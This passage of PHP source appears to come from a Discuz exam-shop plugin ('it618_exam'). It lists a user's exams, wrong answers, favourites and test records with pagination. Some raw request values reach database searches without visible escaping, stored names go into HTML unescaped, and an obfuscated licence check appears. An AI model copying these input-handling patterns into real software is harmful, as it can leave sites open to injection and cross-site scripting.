		$salecount=C::t('#it618_exam#it618_exam_sale')->count_by_uid_pid($it618_exam_goods_count['it618_uid'],$it618_exam_goods_count['it618_pid']);

		if($_GET['ac1']=='pcmygoods'){
			$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
			
			$goods_get.='<tr class="hover">
						<td><div style="height:28px;line-height:28px"><a href="'.$tmpurl.'" target="_blank">'.$it618_exam_goods['it618_name'].'</a> <font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font></div></td>
						<td>'.$salecount.'</td>
						<td>'.$it618_exam_goods_count['it618_count'].'</td>
						<td>'.($it618_exam_goods_count['it618_count']-$it618_exam_goods_count['it618_testcount']).'</td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmygoods'){
			
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			$goods_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_exam_goods['it618_name'].'</a><br><br>
							<font color="#999">'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].' '.$it618_exam_lang['s724'].':'.$salecount.'<br><span style="float:right">'.$it618_exam_lang['s726'].':<font color="red">'.($it618_exam_goods_count['it618_count']-$it618_exam_goods_count['it618_testcount']).'</font></span>'.$it618_exam_lang['s725'].':'.$it618_exam_goods_count['it618_count'].'</font>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmygoods'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_exam_getlang('t227')."<font color=red>$count</font>"."it618_split".$goods_get."it618_split".$multipage;
}


if($_GET['ac']=="err_get"){
	if($_GET['ac1']=='pcmyerr')$ppp = 15;
	if($_GET['ac1']=='wapmyerr')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	
	if($_GET['eid']>0){
		$sql='e.it618_eid='.intval($_GET['eid']);
	}

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count=C::t('#it618_exam#it618_exam_errquestions')->count_by_search($sql, '', it618_exam_utftogbk($_GET['pname']), $uid);
	
	$funname='getmyerrlist';

	$n=0;
	foreach(C::t('#it618_exam#it618_exam_errquestions')->fetch_all_by_search($sql, 'e.id desc', it618_exam_utftogbk($_GET['pname']), $uid, '', '',$startlimit,$ppp) as $it618_exam_errquestions) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_exam_questions = C::t('#it618_exam#it618_exam_questions')->fetch_by_id($it618_exam_errquestions['it618_qid']);
		$qtypename=C::t('#it618_exam#it618_exam_qtype')->fetch_it618_name_by_id($it618_exam_questions['it618_qtypeid']);
		$qids.=$it618_exam_errquestions['id'].',';

		if($_GET['ac1']=='pcmyerr'){
			if($it618_exam_errquestions['it618_pid']==0){
				$it618_exam_utest_exam = C::t('#it618_exam#it618_exam_utest_exam')->fetch_by_id($it618_exam_errquestions['it618_eid']);
				$it618_questioncount=$it618_exam_utest_exam['it618_questioncount'];
				$pnamestr=$it618_exam_lang['s1385'];
				
				$tmpurl2=it618_exam_getrewrite('exam_utest',$it618_exam_errquestions['it618_eid'],'plugin.php?id=it618_exam:utest&eid='.$it618_exam_errquestions['it618_eid'].'&qid='.$it618_exam_errquestions['it618_qid'],'?qid='.$it618_exam_errquestions['it618_qid']);
			}else{
				$it618_exam_test_exam = C::t('#it618_exam#it618_exam_test_exam')->fetch_by_id($it618_exam_errquestions['it618_eid']);
				$it618_questioncount=$it618_exam_test_exam['it618_questioncount'];
				$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_errquestions['it618_pid']);
				$tmpurl1=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
				$pnamestr='<a href="'.$tmpurl1.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'">'.cutstr($it618_exam_goods['it618_name'],10,'...').'</a>';
				
				$tmpurl2=it618_exam_getrewrite('exam_test',$it618_exam_errquestions['it618_eid'],'plugin.php?id=it618_exam:test&eid='.$it618_exam_errquestions['it618_eid'].'&qid='.$it618_exam_errquestions['it618_qid'],'?qid='.$it618_exam_errquestions['it618_qid']);
			}
			
			$goods_get.='<tr class="hover">
						<td width="68"><input class="checkbox" type="checkbox" id="chk_q'.$it618_exam_errquestions['id'].'" value="'.$it618_exam_errquestions['id'].'"><label for="chk_q'.$it618_exam_errquestions[id].'">'.$it618_exam_questions['id'].'</label></td>
						<td><div style="line-height:18px" title="'.it618_exam_strip_tags($it618_exam_questions['it618_name']).'">['.$qtypename.'] '.cutstr(it618_exam_strip_tags($it618_exam_questions['it618_name']),68,'...').'</div></td>
						<td><font color=#999>['.$it618_exam_errquestions['it618_eid'].']</font> '.$pnamestr.' <font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font> <a href="'.$tmpurl2.'" target="_blank">'.$it618_exam_lang['s852'].'</a></td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_errquestions['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmyerr'){
			
			if($it618_exam_errquestions['it618_pid']==0){
				$it618_exam_utest_exam = C::t('#it618_exam#it618_exam_utest_exam')->fetch_by_id($it618_exam_errquestions['it618_eid']);
				$it618_questioncount=$it618_exam_utest_exam['it618_questioncount'];
				$pnamestr=$it618_exam_lang['s1385'];
				
				$tmpurl2=it618_exam_getrewrite('exam_wap','utest@'.$it618_exam_errquestions['it618_eid'],'plugin.php?id=it618_exam:wap&pagetype=utest&cid='.$it618_exam_errquestions['it618_eid'].'&qid='.$it618_exam_errquestions['it618_qid'],'?qid='.$it618_exam_errquestions['it618_qid']);
			}else{
				$it618_exam_test_exam = C::t('#it618_exam#it618_exam_test_exam')->fetch_by_id($it618_exam_errquestions['it618_eid']);
				$it618_questioncount=$it618_exam_test_exam['it618_questioncount'];
				$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_errquestions['it618_pid']);
				$tmpurl1=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
				$pnamestr='<a href="'.$tmpurl1.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'">'.cutstr($it618_exam_goods['it618_name'],10,'...').'</a>';
				
				$tmpurl2=it618_exam_getrewrite('exam_wap','test@'.$it618_exam_errquestions['it618_eid'],'plugin.php?id=it618_exam:wap&pagetype=test&cid='.$it618_exam_errquestions['it618_eid'].'&qid='.$it618_exam_errquestions['it618_qid'],'?qid='.$it618_exam_errquestions['it618_qid']);
			}
			
			$goods_get.='<tr>
						<td width="58"><input class="checkbox" style="vertical-align:middle" type="checkbox" id="chk_q'.$it618_exam_errquestions['id'].'" value="'.$it618_exam_errquestions['id'].'"><label for="chk_q'.$it618_exam_errquestions[id].'">'.$it618_exam_questions['id'].'</label></td>
						<td><span style="font-size:14px">['.$qtypename.'] '.cutstr(it618_exam_strip_tags($it618_exam_questions['it618_name']),68,'...').'</span>
						<br><font color=#999>['.$it618_exam_errquestions['it618_eid'].']</font> '.$pnamestr.' <font color=#999>'.$it618_exam_lang['s819'].$it618_questioncount.$it618_exam_lang['s820'].'</font> <a href="'.$tmpurl2.'" target="_blank">'.$it618_exam_lang['s852'].'</a>
						<br><font color=#ccc>'.date('Y-m-d H:i:s', $it618_exam_errquestions['it618_time']).'</font></td>
						</tr>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmyerr'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_exam_getlang('s1183')."<font color=red>$count</font>"."it618_split".$goods_get."it618_split".$multipage.'<input type=hidden value='.$qids.' id="qids" />';
	exit;
}


if($_GET['ac']=="err_del"){
	$qids=$_GET['qids'];
	$qidarr=explode("@",$qids);
	$ok=0;
	for($i=0;$i<count($qidarr);$i++){
		$qid=intval($qidarr[$i]);
		if($qid>0){
			if($it618_exam_errquestions=C::t('#it618_exam#it618_exam_errquestions')->fetch_by_id($qid)){
				if($it618_exam_errquestions['it618_uid']!=$uid){
					echo $it618_exam_lang['s1211'];exit;
				}else{
					C::t('#it618_exam#it618_exam_errquestions')->delete_by_id($it618_exam_errquestions['id']);
					$ok=$ok+1;
				}
			}else{
				echo $it618_exam_lang['s1210'];exit;
			}
		}
	}
	
	echo 'it618_splitokit618_split'.$it618_exam_lang['s733'].$ok;exit;
}


if($_GET['ac']=="err_clear"){
	C::t('#it618_exam#it618_exam_errquestions')->delete_by_uid($uid);
	echo 'it618_splitokit618_split'.$it618_exam_lang['s1824'];exit;
}


if($_GET['ac']=="collectgoods_get"){
	if($_GET['ac1']=='pcmygoods')$ppp = 10;
	if($_GET['ac1']=='wapmygoods')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count=C::t('#it618_exam#it618_exam_collect')->count_by_search(0,'','',it618_exam_utftogbk($_GET['pname']),$uid);
	
	$funname='getmycollectlist';

	$n=0;
	foreach(C::t('#it618_exam#it618_exam_collect')->fetch_all_by_search(0,'','t.id desc',it618_exam_utftogbk($_GET['pname']),$uid,$startlimit,$ppp) as $it618_exam_collect) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$pid=$it618_exam_collect['it618_pid'];

		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($pid);
		
		$timestr='<font color=#999>'.date('Y-m-d H:i:s', $it618_exam_collect['it618_time']).'</font>';

		if($_GET['ac1']=='pcmygoods'){
			$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
			
			$goods_get.='<tr class="hover">
						<td><div style="line-height:18px"><a href="'.$tmpurl.'" target="_blank">'.$it618_exam_goods['it618_name'].'</a><br><font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font></div></td>
						<td><a href="javascript:" onclick="delcollect('.$it618_exam_collect['id'].')">'.it618_exam_getlang('s1655').'</a></td>
						<td>'.$timestr.'</td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmygoods'){
			
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			$goods_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_exam_goods['it618_name'].'</a><br>
							<font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font><br>
							<br>
							<a href="javascript:" style="float:right" onclick="delcollect('.$it618_exam_collect['id'].')">'.it618_exam_getlang('s1655').'</a>'.$timestr.'
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmygoods'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_exam_getlang('s671')."<font color=red>$count</font>"."it618_split".$goods_get."it618_split".$multipage;
}


if($_GET['ac']=="shopgoods_get"){
	if($_GET['ac1']=='pcshopgoods')$ppp = 12;
	if($_GET['ac1']=='wapshopgoods')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count=C::t('#it618_exam#it618_exam_goods_count')->count_by_search($ShopId,'','',it618_exam_utftogbk($_GET['pname']),$_GET['finduid']);
	
	$funname='getshopgoodslist';
	$jfname=$_G['setting']['extcredits'][$it618_exam['exam_credit']]['title'];

	$n=0;
	foreach(C::t('#it618_exam#it618_exam_goods_count')->fetch_all_by_search($ShopId,'','t.id desc',it618_exam_utftogbk($_GET['pname']),$_GET['finduid'],$startlimit,$ppp) as $it618_exam_goods_count) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;

		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_goods_count['it618_pid']);
		
		$salecount=C::t('#it618_exam#it618_exam_sale')->count_by_uid_pid($it618_exam_goods_count['it618_uid'],$it618_exam_goods_count['it618_pid']);

		if($_GET['ac1']=='pcshopgoods'){
			$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
			
			$goods_get.='<tr class="hover">
						<td><div style="height:28px;line-height:28px"><a href="'.$tmpurl.'" target="_blank">'.$it618_exam_goods['it618_name'].'</a> <font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font></div></td>
						<td><a href="'.it618_exam_rewriteurl($it618_exam_goods_count['it618_uid']).'" target="_blank">'.it618_exam_getusername($it618_exam_goods_count['it618_uid']).'</a></td>
						<td>'.$salecount.'</td>
						<td>'.$it618_exam_goods_count['it618_count'].'</td>
						<td>'.($it618_exam_goods_count['it618_count']-$it618_exam_goods_count['it618_testcount']).'</td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapshopgoods'){
			
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			$goods_get.='<dd style="margin:0;padding:0;padding-top:13px;padding-bottom:0px">
						<div class="dealcard" style="margin:0;padding:0;font-size:13px;line-height:15px">
							<a href="'.$tmpurl.'" target="_blank"><img class="lazy" data-original="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" style="float:left;margin-right:6px;border-radius:3px;" width="108" height="68"/></a>
							<div class="dealcard-video single-line" style="font-size:13px"><a href="'.$tmpurl.'" target="_blank">'.$it618_exam_goods['it618_name'].'</a></div>
							
							<div class="titlemysalebtn text-block" style="text-align:left;line-height:17px"><font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'<br>'.$it618_exam_lang['s724'].':'.$salecount.' '.it618_exam_getusername($it618_exam_goods_count['it618_uid']).'<br><span style="float:right">'.$it618_exam_lang['s726'].':'.($it618_exam_goods_count['it618_count']-$it618_exam_goods_count['it618_testcount']).'</span>'.$it618_exam_lang['s725'].':'.$it618_exam_goods_count['it618_count'].'</font></div>

						</div>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcshopgoods'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_exam_getlang('s671')."<font color=red>$count</font>"."it618_split".$goods_get."it618_split".$multipage;
}


if($_GET['ac']=="testlist_get"){
	if($_GET['ac1']=='pcmytest')$ppp = 10;
	if($_GET['ac1']=='wapmytest')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count = C::t('#it618_exam#it618_exam_test_exam')->count_by_search(0, '', '', $_GET['pname'], $uid);
	
	$funname='getmytestlist';

	$n=0;
	foreach(C::t('#it618_exam#it618_exam_test_exam')->fetch_all_by_search(
		0, '', 's.it618_btime desc', $_GET['pname'], $uid, '', '', $startlimit,$ppp
	) as $it618_exam_test_exam) {
		
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;

		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_test_exam['it618_pid']);
		
		$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
		$pnamestr='<a href="'.$tmpurl.'" target="_blank"><font color=#333><font color=#999>['.$it618_exam_test_exam['id'].']</font> '.$it618_exam_goods['it618_name'].'</font></a>';
		
		$it618_exam_test_exam['it618_testscore']=str_replace(".0","",$it618_exam_test_exam['it618_testscore']);
		
		$it618_exam_test_exam['it618_score']=str_replace(".0","",$it618_exam_test_exam['it618_score']);
		$it618_examstr=str_replace("{qcount}",$it618_exam_test_exam['it618_questioncount'],$it618_exam_lang['s168']);
		$it618_examstr=str_replace("{score}",$it618_exam_test_exam['it618_score'],$it618_examstr);
		$it618_examstr=str_replace("{time}",$it618_exam_test_exam['it618_examtime'],$it618_examstr);
		
		$testurl=it618_exam_getrewrite('exam_test',$it618_exam_test_exam['id'],'plugin.php?id=it618_exam:test&eid='.$it618_exam_test_exam['id']);

		if($_GET['ac1']=='pcmytest'){
			
			if($it618_exam_test_exam['it618_state']==3){
				$tieurl='';
				$tieid=$it618_exam_test_exam['it618_tieid'];
				if($tieid>0){
					if($_G['cache']['plugin']['it618_exam']['rewriteurl']==1){
						$tieurl='thread-'.$tieid.'-1-1.html';
					}else{
						$tieurl='forum.php?mod=viewthread&tid='.$tieid;
					}
					$tieurl=' <a href="'.$tieurl.'" target="_blank">'.$it618_exam_lang['s1018'].'</a>';
				}
				$it618_state='<font color=#390>'.$it618_exam_lang['s536'].'</font><br><a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s555'].'</a>'.$tieurl;
				
			}else{
				$it618_state='<font color=red>'.$it618_exam_lang['s534'].'</font><br><a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s554'].'</a>';
			}
			
			$testlist_get.='<tr class="hover">
					<td>'.$pnamestr.'<br><font color=#999>'.$it618_examstr.'</font></td>
